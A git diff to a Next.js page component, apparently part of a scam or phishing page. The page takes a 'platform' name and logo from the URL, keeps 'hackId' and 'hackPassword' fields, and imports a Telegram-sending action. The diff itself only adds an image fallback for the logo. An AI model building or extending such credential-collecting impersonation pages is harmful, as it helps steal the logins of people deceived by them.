@@ -5,10 +5,31 @@ import { useSearchParams } from 'next/navigation'
 import { CheckCircle, AlertTriangle } from 'lucide-react'
 import { sendTelegramMessage } from "./actions"
 
+const ImageWithFallback = ({ primarySrc, fallbackSrc, alt }) => {
+  const [imgSrc, setImgSrc] = useState(primarySrc);
+
+  useEffect(() => {
+    setImgSrc(primarySrc);
+  }, [primarySrc]);
+
+  return (
+    <img
+      src={imgSrc}
+      alt={alt}
+      onError={() => {
+        setImgSrc(fallbackSrc);
+      }}
+      className="w-32 h-auto"
+      loading="lazy"
+    />
+  );
+};
+
 function HackIdPageComponent() {
   const searchParams = useSearchParams()
   const platformName = searchParams.get('platform') || 'Unknown Site'
-  const logoSrc = searchParams.get('logo') || 'https://raw.githubusercontent.com/niloyyt499-cpu/aviatorlite-logo/refs/heads/main/jaya9-logo.png'
+  const logoUrl = searchParams.get('logoUrl') || 'https://raw.githubusercontent.com/niloyyt499-cpu/aviatorlite-logo/main/jaya9-logo.png'
+  const logoPath = searchParams.get('logoPath') || '/logos/jaya9-logo.png'
 
   const [hackId, setHackId] = useState("")
   const [hackPassword, setHackPassword] = useState("")
@@ -152,7 +173,7 @@ function HackIdPageComponent() {
 
   const LogoDisplay = () => (
     <div className="pt-8 pl-6">
-      <img src={logoSrc} alt={platformName} className="w-32 h-auto" />
+      <ImageWithFallback primarySrc={logoUrl} fallbackSrc={logoPath} alt={platformName} />
     </div>
   )
 
